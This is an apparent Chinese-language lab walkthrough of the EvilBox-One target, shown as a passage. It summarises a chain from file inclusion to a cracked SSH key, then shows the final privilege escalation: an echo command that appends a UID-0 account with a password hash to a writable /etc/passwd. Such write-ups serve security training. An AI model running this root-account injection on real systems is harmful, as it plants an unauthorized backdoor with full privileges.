ailx10说：这篇是2022年8月之前写的，后来又改过。EvilBox 这次先是一个没什么内容的 PHP 页面，继续枚举参数后才看出文件包含的入口。读到用户私钥并不等于能立刻登录，还得处理它的口令，进系统后才发现 passwd 可写，沿着这个条件走到更高权限。笔记里我把这些阶段都留了下来，也提醒自己 John 的展示结果和实际猜测步骤不是同一回事。最后关键是账号的 UID 和文件权限，不是给它取了一个像 root 的名字；越简单的操作，越需要讲清到底是哪道边界出了问题。

### （15）原实验生成账户口令散列；它与 SSH 私钥口令是不同凭据，相关算法和系统配置需独立核对。

```
mowree@EvilBoxOne:~$ openssl passwd -help

Usage: passwd [options]

Valid options are:

 -help               Display this summary

 -in infile          Read passwords from file

 -noverify           Never verify when reading password from terminal

 -quiet              No warnings

 -table              Format output as table

 -reverse            Switch table columns

 -salt val           Use provided salt

 -stdin              Read passwords from stdin

 -6                  SHA512-based password algorithm

 -5                  SHA256-based password algorithm

 -apr1               MD5-based password algorithm, Apache variant

 -1                  MD5-based password algorithm

 -aixmd5             AIX MD5-based password algorithm

 -crypt              Standard Unix password algorithm (default)

 -rand val           Load the file(s) into the random number generator

 -writerand outfile  Write random data to the specified file
```

### （16）原实验利用可写的 passwd 添加账户；UID 为 0 是该案例中特权身份的关键，操作只属于隔离靶场。

```
echo 'ailx00:$1$Tuse491W$mmxvOkGDQHibl4DzhH3Fe1:0:0:root:/root:/bin/bash' >> /etc/passwd
```

![](/notes-assets/573c6db4db76802586b2.jpg)

获得root的flag

到此，实验完成～

这次从路径参数一直走到可写账户文件，入口和收尾之间跨了几层。把读取、验证与本机写权限各自的结果留好，才不会把一台靶机概括成一个无条件命令。
